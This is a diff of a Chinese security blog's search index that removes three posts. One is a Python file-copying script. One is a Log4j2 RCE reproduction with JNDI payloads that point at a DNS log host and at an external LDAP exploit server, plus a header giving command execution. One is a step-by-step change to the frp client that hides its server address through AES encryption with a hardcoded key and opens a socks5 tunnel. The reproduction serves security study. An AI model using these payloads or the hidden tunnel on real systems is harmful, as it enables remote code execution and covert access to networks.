-<h2 id="需求"><a class="header-anchor" href="#需求">¶</a>需求</h2>
-<p>要求：解析<code>&quot;文件信息.txt&quot;</code>，根据解析出的<code>md5</code>值找到对应的文件，按照解析出的文件路径复制到相应的目录下。<br>
-例如：解析第一行，根据第一个<code>md5</code>值<code>38C45AC1A54F65732CFE56C7BCC17A87</code>遍历当前文件夹及子文件夹找到对应的文件<code>123.exe</code>，再根据解析出的路径<code>&quot;I_DONOT_远控&quot;</code>复制到<code>&quot;C:\I\DONOT\远控&quot;</code>下。</p>
-<h2 id="Code"><a class="header-anchor" href="#Code">¶</a>Code</h2>
-<div class="note info"><p>阅读本篇文章能了解到：python</p></div>
-<a id="more"></a>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os,hashlib,shutil</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;文件信息.txt&#x27;</span>, encoding=<span class="string">&#x27;utf-8-sig&#x27;</span>, mode=<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> inF:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> inF:</span><br><span class="line">            temp = line.strip().split(<span class="string">&#x27;#&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;\t\t&#x27;</span>)</span><br><span class="line">            print(temp)</span><br><span class="line">            _md5 = temp[<span class="number">0</span>]</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> parent, dirnames, filenames <span class="keyword">in</span> os.walk(<span class="string">&#x27;.\\&#x27;</span>,topdown=<span class="literal">False</span>):</span><br><span class="line">                <span class="keyword">for</span> filename <span class="keyword">in</span> filenames:</span><br><span class="line">                    file_path = os.path.join(parent, filename)</span><br><span class="line">                    <span class="keyword">with</span> open(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fileF:</span><br><span class="line">                        md5obj = hashlib.md5()</span><br><span class="line">                        md5obj.update(fileF.read())</span><br><span class="line">                        _hash = md5obj.hexdigest().upper()</span><br><span class="line">                        <span class="keyword">if</span> _md5 == _hash:</span><br><span class="line">                            flag = <span class="number">1</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> flag:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            dirFile = temp[<span class="number">2</span>].strip().split(<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">            pathTemp = <span class="string">&#x27;c:\\&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> dirFile:</span><br><span class="line">                pathTemp += i+<span class="string">&#x27;\\&#x27;</span></span><br><span class="line">                os.mkdir(pathTemp)</span><br><span class="line">            shutil.copy(file_path, pathTemp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>笔记</tag>
-        <tag>python</tag>
       </tags>
   </entry>
   <entry>
@@ -1083,96 +1223,6 @@ Windows 10 Version 1809 for 32-bit Systems</p>
         <tag>安全狗</tag>
         <tag>绕过</tag>
         <tag>bypass</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Apache - Log4j2 RCE复现</title>
-    <url>/2021/12/11/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<img src="/2021/12/11/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/icloud.png" class="">
-<h2 id="环境搭建"><a class="header-anchor" href="#环境搭建">¶</a>环境搭建</h2>
-<p>使用<code>T00ls</code>大佬的环境，<code>war</code>包放到<code>webapps</code>下重启<code>tomcat</code>即可</p>
-<div class="note info"><p>阅读本篇文章能了解到：apache, rce，Log4j2</p></div>
-<a id="more"></a>
-<blockquote>
-<p><a href="https://www.t00ls.cc/viewthread.php?tid=63695&amp;extra=&amp;page=1">https://www.t00ls.cc/viewthread.php?tid=63695&amp;extra=&amp;page=1</a></p>
-</blockquote>
-<p>这里我要多说几句，因为我用的<code>jspstudy</code>，搭建环境踩了不少坑，记录下，主要是<code>jspstudy</code>的坑</p>
-<p>首先把<code>war</code>包放到<code>webapps</code>下并不会自解压，放到<code>www</code>一样不解压</p>
-<p>解决方案：<code>JspStudy\tomcat\conf</code>文件夹下<code>server.xml</code>，注释掉<code>&lt;Context docBase=&quot;D:\JspStudy\WWW\&quot; path=&quot;&quot;&gt;&lt;/Context&gt;</code>，放到<code>webapps</code>即可自解压</p>
-<p>设置根目录为<code>D:\JspStudy\WWW\ROOT</code>，访问<code>http://127.0.0.1:8080</code>，页面正常</p>
-<p>提交<code>payload</code>，报500错</p>
-<p><img src="500.png" alt="500"></p>
-<p>经查，大概是<code>jdk</code>版本问题，打开<code>jdk</code>目录查看<code>java</code>版本为<code>1.7.0_60</code>，盲猜版本过低</p>
-<p>解决方案：安装<code>jre1.8</code>32位，拷贝<code>bin</code>、<code>lib</code>目录，替换<code>JspStudy\JDK\jre\</code>，替换前先把<code>bin</code>目录下<code>java-JspStudy.exe</code>备份一份，替换后再拷贝进去</p>
-<p>重启<code>tomcat</code>解决500错误，8错，nice，我已经准备不再用他了😅</p>
-<h2 id="RCE"><a class="header-anchor" href="#RCE">¶</a>RCE</h2>
-<h3 id="1-dnslog"><a class="header-anchor" href="#1-dnslog">¶</a>1. dnslog</h3>
-<p>先使用dns测试漏洞</p>
-<blockquote>
-<p>payload: ${jndi:ldap://redn3ck.xxx.ceye.io}</p>
-</blockquote>
-<p><img src="dns.png" alt="dns"></p>
-<h3 id="2-rce"><a class="header-anchor" href="#2-rce">¶</a>2. rce</h3>
-<p>下载<a href="https://github.com/0x727/JNDIExploit">https://github.com/0x727/JNDIExploit</a>，跑起服务</p>
-<p><img src="JNDIExploit.png" alt="JNDIExploit"></p>
-<blockquote>
-<p>payload: ${jndi:ldap://207.xxx.xxx.111:1389/TomcatBypass/TomcatEcho}</p>
-</blockquote>
-<p><code>header</code>中填入<code>Cmd: cmd</code>即可<code>rce</code></p>
-<p><img src="rce.png" alt="rce"></p>
-<h2 id="参考链接"><a class="header-anchor" href="#参考链接">¶</a>参考链接</h2>
-<blockquote>
-<p><a href="https://www.t00ls.cc/viewthread.php?tid=63695">https://www.t00ls.cc/viewthread.php?tid=63695</a><br>
-<a href="https://www.t00ls.cc/viewthread.php?tid=63705">https://www.t00ls.cc/viewthread.php?tid=63705</a></p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>复现</tag>
-        <tag>apache</tag>
-        <tag>rce</tag>
-        <tag>Log4j2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Frp改造 - 参数版+AES加密</title>
-    <url>/2022/01/11/Frp%E6%94%B9%E9%80%A0-%E5%8F%82%E6%95%B0%E7%89%88-AES%E5%8A%A0%E5%AF%86/</url>
-    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
-<p>参数版已经有很多大佬改造过了，因为最近有需求需要把参数加密化，网上没找到现成的，所以手动改造，顺便学一点<code>go</code>语言 😅</p>
-<p>基于<code>uknowsec</code>大佬的文章 <a href="https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html">FRP改造计划</a>，实现作者说的：</p>
-<blockquote>
-<p>所以可以直接加一些加密啥的，-t参数传入ip加密后的地址，然后在源码里加一个解密的步骤即可。</p>
-</blockquote>
-<p>另外，个人觉得只加密<code>ip</code>不够隐蔽，所以连同<code>port</code>一起进行<code>AES</code>加密</p>
-<h2 id="改造"><a class="header-anchor" href="#改造">¶</a>改造</h2>
-<p>只需要修改<code>cmd/frpc/sub/root.go</code>即可</p>
-<a id="more"></a>
-<h3 id="1-创建AES函数"><a class="header-anchor" href="#1-创建AES函数">¶</a>1. 创建<code>AES</code>函数</h3>
-<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PKCS7Padding</span><span class="params">(ciphertext []<span class="keyword">byte</span>, blockSize <span class="keyword">int</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	padding := blockSize - <span class="built_in">len</span>(ciphertext)%blockSize</span><br><span class="line">	padtext := bytes.Repeat([]<span class="keyword">byte</span>&#123;<span class="keyword">byte</span>(padding)&#125;, padding)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">append</span>(ciphertext, padtext...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PKCS7UnPadding</span><span class="params">(origData []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	length := <span class="built_in">len</span>(origData)</span><br><span class="line">	unpadding := <span class="keyword">int</span>(origData[length<span class="number">-1</span>])</span><br><span class="line">	<span class="keyword">return</span> origData[:(length - unpadding)]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AesEncrypt</span><span class="params">(origData, key []<span class="keyword">byte</span>)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span> &#123;</span><br><span class="line">	block, err := aes.NewCipher(key)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	blockSize := block.BlockSize()</span><br><span class="line">	origData = PKCS7Padding(origData, blockSize)</span><br><span class="line">	blockMode := cipher.NewCBCEncrypter(block, key[:blockSize])</span><br><span class="line">	crypted := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(origData))</span><br><span class="line">	blockMode.CryptBlocks(crypted, origData)</span><br><span class="line">	<span class="keyword">return</span> crypted, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AesDecrypt</span><span class="params">(crypted, key []<span class="keyword">byte</span>)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span> &#123;</span><br><span class="line">	block, err := aes.NewCipher(key)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	blockSize := block.BlockSize()</span><br><span class="line">	blockMode := cipher.NewCBCDecrypter(block, key[:blockSize])</span><br><span class="line">	origData := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(crypted))</span><br><span class="line">	blockMode.CryptBlocks(origData, crypted)</span><br><span class="line">	origData = PKCS7UnPadding(origData)</span><br><span class="line">	<span class="keyword">return</span> origData, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="2-初始化中定义传参"><a class="header-anchor" href="#2-初始化中定义传参">¶</a>2. 初始化中定义传参</h3>
-<p>只需传一个参数，里面包含<code>ip</code>和<code>port</code>即可</p>
-<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">func init() &#123;</span><br><span class="line">	rootCmd.PersistentFlags().StringVarP(&amp;cfgFile, &quot;config&quot;, &quot;c&quot;, &quot;./frpc.ini&quot;, &quot;config file of frpc&quot;)</span><br><span class="line">	rootCmd.PersistentFlags().BoolVarP(&amp;showVersion, &quot;version&quot;, &quot;v&quot;, false, &quot;version of frpc&quot;)</span><br><span class="line"><span class="addition">+	rootCmd.PersistentFlags().StringVarP(&amp;ipPort, &quot;ipPort&quot;, &quot;t&quot;, &quot;&quot;, &quot;ip port&quot;)</span></span><br><span class="line">	kcpDoneCh = make(chan struct&#123;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="3-新增函数"><a class="header-anchor" href="#3-新增函数">¶</a>3. 新增函数</h3>
-<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getFileContent</span><span class="params">(ipPort <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	AesKey := []<span class="keyword">byte</span>(<span class="string">&quot;1qaz2wsx3edc4rfv&quot;</span>)  <span class="comment">// 对称秘钥长度必须是16的倍数</span></span><br><span class="line">	encrypted, _ := base64.StdEncoding.DecodeString(ipPort)</span><br><span class="line">	origin, err := AesDecrypt(encrypted, AesKey)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	arr := strings.Fields(<span class="keyword">string</span>(origin))</span><br><span class="line">	ip := arr[<span class="number">0</span>]</span><br><span class="line">	port := arr[<span class="number">1</span>]</span><br><span class="line">	<span class="keyword">var</span> content <span class="keyword">string</span> = <span class="string">`[common]</span></span><br><span class="line"><span class="string">    server_addr = `</span> + ip + <span class="string">`</span></span><br><span class="line"><span class="string">    server_port = `</span> + port + <span class="string">`</span></span><br><span class="line"><span class="string">	tls_enable = true</span></span><br><span class="line"><span class="string">    token = socks</span></span><br><span class="line"><span class="string">	[socks]</span></span><br><span class="line"><span class="string">	type = tcp</span></span><br><span class="line"><span class="string">	remote_port = 1800</span></span><br><span class="line"><span class="string">	plugin = socks5</span></span><br><span class="line"><span class="string">	`</span></span><br><span class="line">	fileContent = content</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="4-修改runClient函数"><a class="header-anchor" href="#4-修改runClient函数">¶</a>4. 修改<code>runClient</code>函数</h3>
-<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="addition">+ func runClient(cfgFilePath string, ipPort string) (err error) &#123;</span></span><br><span class="line">	var content string</span><br><span class="line"><span class="addition">+	getFileContent(ipPort)</span></span><br><span class="line"><span class="addition">+	// content, err = config.GetRenderedConfFromFile(cfgFilePath)</span></span><br><span class="line"><span class="addition">+	content, err = fileContent, nil</span></span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cfg, err := parseClientCommonCfg(CfgFileTypeIni, content)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pxyCfgs, visitorCfgs, err := config.LoadAllConfFromIni(cfg.User, content, cfg.Start)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = startService(cfg, pxyCfgs, visitorCfgs, cfgFilePath)</span><br><span class="line">	return</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="5-调用runClient"><a class="header-anchor" href="#5-调用runClient">¶</a>5. 调用<code>runClient()</code></h3>
-<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">var rootCmd = &amp;cobra.Command&#123;</span><br><span class="line">	Use:   &quot;frpc&quot;,</span><br><span class="line">	Short: &quot;frpc is the client of frp (https://github.com/fatedier/frp)&quot;,</span><br><span class="line">	RunE: func(cmd *cobra.Command, args []string) error &#123;</span><br><span class="line">		if showVersion &#123;</span><br><span class="line">			fmt.Println(version.Full())</span><br><span class="line">			return nil</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		// Do not show command usage here.</span><br><span class="line"><span class="addition">+		err := runClient(cfgFile, ipPort)</span></span><br><span class="line">		if err != nil &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			os.Exit(1)</span><br><span class="line">		&#125;</span><br><span class="line">		return nil</span><br><span class="line">	&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="6-编译"><a class="header-anchor" href="#6-编译">¶</a>6. 编译</h3>
-<p>修改根目录<code>package.sh</code>，实现直接生成编译文件而不打包</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># compile for version</span></span><br><span class="line">make</span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;make error&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">frp_version=`./bin/frps --version`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;build version: <span class="variable">$frp_version</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cross_compiles</span></span><br><span class="line">make -f ./Makefile.cross-compiles</span><br><span class="line"></span><br><span class="line">rm -rf ./release/packages</span><br><span class="line">mkdir -p ./release/packages</span><br><span class="line"></span><br><span class="line">os_all=<span class="string">&#x27;linux windows darwin freebsd&#x27;</span></span><br><span class="line">arch_all=<span class="string">&#x27;386 amd64 arm arm64 mips64 mips64le mips mipsle&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ./release</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> os <span class="keyword">in</span> <span class="variable">$os_all</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> arch <span class="keyword">in</span> <span class="variable">$arch_all</span>; <span class="keyword">do</span></span><br><span class="line">        frp_dir_name=<span class="string">&quot;frp_<span class="variable">$&#123;frp_version&#125;</span>_<span class="variable">$&#123;os&#125;</span>_<span class="variable">$&#123;arch&#125;</span>&quot;</span></span><br><span class="line">        frp_path=<span class="string">&quot;./packages/frp_<span class="variable">$&#123;frp_version&#125;</span>_<span class="variable">$&#123;os&#125;</span>_<span class="variable">$&#123;arch&#125;</span>&quot;</span></span><br><span class="line">        <span class="built_in">cd</span> ..</span><br><span class="line">        rm -rf <span class="variable">$&#123;frp_path&#125;</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> -</span><br></pre></td></tr></table></figure>
-<p>编译</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash package.sh</span><br></pre></td></tr></table></figure>
-<h2 id="效果"><a class="header-anchor" href="#效果">¶</a>效果</h2>
-<p><img src="frpc.png" alt="frpc"></p>
-<h2 id="参考链接"><a class="header-anchor" href="#参考链接">¶</a>参考链接</h2>
-<blockquote>
-<p><a href="https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html">https://uknowsec.cn/posts/notes/FRP改造计划.html</a></p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>frp</tag>
-        <tag>go</tag>
-        <tag>AES</tag>
       </tags>
   </entry>
 </search>
